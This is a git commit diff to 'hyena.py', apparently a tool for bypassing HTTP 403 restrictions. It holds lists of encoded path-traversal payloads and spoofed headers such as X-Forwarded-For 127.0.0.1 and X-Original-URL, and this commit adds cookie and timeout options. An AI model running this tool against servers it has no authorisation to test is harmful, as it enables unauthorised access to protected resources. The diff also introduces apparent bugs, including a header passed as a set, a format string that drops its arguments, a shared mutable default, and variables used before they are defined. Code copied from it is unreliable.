291cb127e65d7f9237d4e3368ce48d631ca12eed
walpurgisnatch <Kawemirs@gmail.com>
2021-04-20 20:26:11 +0700

    cookie and timeout arguments

--- hyena.py
+++ hyena.py
@@ -3,21 +3,33 @@ import re
 import argparse
 
 first = ["%2e/", "%252e/", "%2e%2f", "%2e%c0%af", "%252e%c0%af"]
-pre_path = ["%2e/", "%252e/", "//", "\\", "%5c", "%255c", "pupa/lupa/../../", "pupa/lupa/%2e%2e/%2e%2e/", "pupa/lupa/.%2e/.%2e/", "pupa/lupa/%2e./%2e./", "pupa\lupa\%2e%2e\%2e%2e\\", "pupa%5clupa%5c.%2e%5c%2e%5c", "pupa/lupa/%252e%252e/%252e%252e/", "pupa\lupa\%252e%252e\%252e%252e\\", "pupa/lupa/%252e.%5c.%252e%5c", "pupa/lupa/..%c0%af..%c0%af", "pupa/lupa/..%c1%9c..%c1%9c", "pupa/lupa/%252e%252e%c0%af%252e%252e%c0%af", "pupa/lupa/%252e%252e%c1%9c%252e%252e%c1%9c", "pupa/lupa/%2e%2e%c0%af%2e%2e%c1%9c","pupa%5clupa%5c%252e.%5c.%252e%5c", "pupa%c0%aflupa%c0%af..%c0%af..%c0%af", "pupa%c1%9clupa%c1%9c%252e%252e%c1%9c%252e%252e%c1%9c", "pupa%25c1%259clupa%25c1%259c%252e%252e%25c1%259c%252e%252e%25c1%259c", "pupa%25c0%25aflupa%25c0%25af..%25c0%25af..%25c0%25af", "pupa%25c0%25aflupa%25c0%25af%252e%252e%c0%af%252e%252e%c0%af", "%00/"]
+pre_path = ["..;/", "%2e/", "%252e/", "//", "\\", "%5c", "%255c", "pupa/lupa/../../", "pupa/lupa/%2e%2e/%2e%2e/", "pupa/lupa/.%2e/.%2e/", "pupa/lupa/%2e./%2e./", "pupa\lupa\%2e%2e\%2e%2e\\", "pupa%5clupa%5c.%2e%5c%2e%5c", "pupa/lupa/%252e%252e/%252e%252e/", "pupa\lupa\%252e%252e\%252e%252e\\", "pupa/lupa/%252e.%5c.%252e%5c", "pupa/lupa/..%c0%af..%c0%af", "pupa/lupa/..%c1%9c..%c1%9c", "pupa/lupa/%252e%252e%c0%af%252e%252e%c0%af", "pupa/lupa/%252e%252e%c1%9c%252e%252e%c1%9c", "pupa/lupa/%2e%2e%c0%af%2e%2e%c1%9c","pupa%5clupa%5c%252e.%5c.%252e%5c", "pupa%c0%aflupa%c0%af..%c0%af..%c0%af", "pupa%c1%9clupa%c1%9c%252e%252e%c1%9c%252e%252e%c1%9c", "pupa%25c1%259clupa%25c1%259c%252e%252e%25c1%259c%252e%252e%25c1%259c", "pupa%25c0%25aflupa%25c0%25af..%25c0%25af..%25c0%25af", "pupa%25c0%25aflupa%25c0%25af%252e%252e%c0%af%252e%252e%c0%af", "%00/"]
 past_path = ["pupa/lupa/../../", "pupa/lupa/%2e%2e/%2e%2e/", "pupa%c1%9clupa%c1%9c%2e%2e%c1%9c%2e%2e%c1%9c", "/"]
 replace_slash = ["?", "??", "\\", "/\".hithere", "..;/"]
 response_codes = {}
 to_ignore = [400, 403, 404, 500]
 full_path = ""
+timeout = 10
+cookie = ""
 
 def get_args():
+    global timeout
+    global cookie
     parser = argparse.ArgumentParser()
     parser.add_argument("-u", dest="target", help="Target url")
     parser.add_argument("-f", dest="targets", help="File with target urls")
+    parser.add_argument("-t", dest="timeout", help="Timeout")
+    parser.add_argument("-c", "--cookie", dest="cookie", help="Cookie")
     arguments = parser.parse_args()
 
     if not arguments.target and not arguments.targets:
         parser.error("[-] Error: null target")
+
+    if arguments.timeout:
+        timeout = arguments.timeout
+
+    if arguments.cookie:
+        cookie = arguments.cookie
     
     return arguments
 
@@ -35,13 +47,13 @@ def get_main(url):
     slash = re.search('(.+\..+?\/)(.*)', url)
     return slash.group(1), slash.group(2)
 
-def basic_tests(url, main, rest):
+def basic_tests(url, butlast, last):
     access_test(url, "post")
     access_test(url, "head")
     access_test(url, "options")
     access_test(url, "put")
     access_test(url, "patch")
-    access_test(url, "get", { 'Referer': url })
+    access_test(url, "get", { 'Referer': butlast })
     access_test(url, "get", { 'X-Custom-IP-Authorization': "127.0.0.1" })
     access_test(url, "get", { 'X-Originationg-IP': "127.0.0.1" })
     access_test(url, "get", { 'X-Forwarded-For': "127.0.0.1" })
@@ -49,8 +61,8 @@ def basic_tests(url, main, rest):
     access_test(url, "get", { 'X-Client-IP': "127.0.0.1" })
     access_test(url, "get", { 'X-Host': "127.0.0.1" })
     access_test(url, "get", { 'X-Forwarded-Host': "127.0.0.1" })
-    access_test(main, "get", { 'X-Rewrite-URL': '/' + rest })    
-    access_test(main, "get", { 'X-Original-URL': '/' + rest })
+    access_test(butlast, "get", { 'X-Rewrite-URL': '/{}{}'.format(butlast, last) })    
+    access_test(butlast, "get", { 'X-Original-URL': '/'.format(butlast, last) })
 
 def through_file(fname):
     try: 
@@ -69,7 +81,7 @@ def directory_test(url):
     main, rest = get_main(url)
 
     print("\tTesting {}".format(url))
-    basic_tests(url, main, rest)
+    basic_tests(url, path, last)
 
     for f in first:
         access_test(url.replace(main, main + f))
@@ -93,22 +105,26 @@ def directory_test(url):
             npath = path + "/" + last.replace('/', pre)
         access_test(npath)
 
-def request(path, rtype = "get", h = ""):
+def request(path, rtype = "get", h = {}):
+    global timeout
+    if len(h) == 0:
+        h = ""
     if rtype is "get":
-        if h == "":
-            response = requests.get(path, timeout=2.5)
-        else:
-            response = requests.get(path, headers=h, timeout=2.5)         
+        response = requests.get(path, headers=h, timeout=timeout)
     elif rtype is "post":
-        response = requests.post(path, headers={ 'Content-Length': '0' }, timeout=2.5)
+        if h == "":
+            h = { 'Content-Length': '0' }
+        else:
+            h['Content-Length'] = '0'
+        response = requests.post(path, headers={ h }, timeout=timeout)
     elif rtype is "head":
-        response = requests.head(path, timeout=2.5)
+        response = requests.head(path, timeout=timeout, headers=h)
     elif rtype is "options":
-        response = requests.options(path, timeout=2.5)
+        response = requests.options(path, timeout=timeout, headers=h)
     elif rtype is "put":
-        response = requests.put(path, timeout=2.5)
+        response = requests.put(path, timeout=timeout, headers=h)
     elif rtype is "patch":
-        response = requests.patch(path, timeout=2.5)
+        response = requests.patch(path, timeout=timeout, headers=h)
     else:
         return "error"
     return response
@@ -118,7 +134,10 @@ def full_path_match(url):
         return True
     return False
 
-def access_test(path, rtype = "get", h = ""):
+def access_test(path, rtype = "get", h = {}):
+    global cookie 
+    if cookie != "":
+        h['Cookie'] = cookie
     try:
         response = request(path, rtype, h)        
         sc = response.status_code
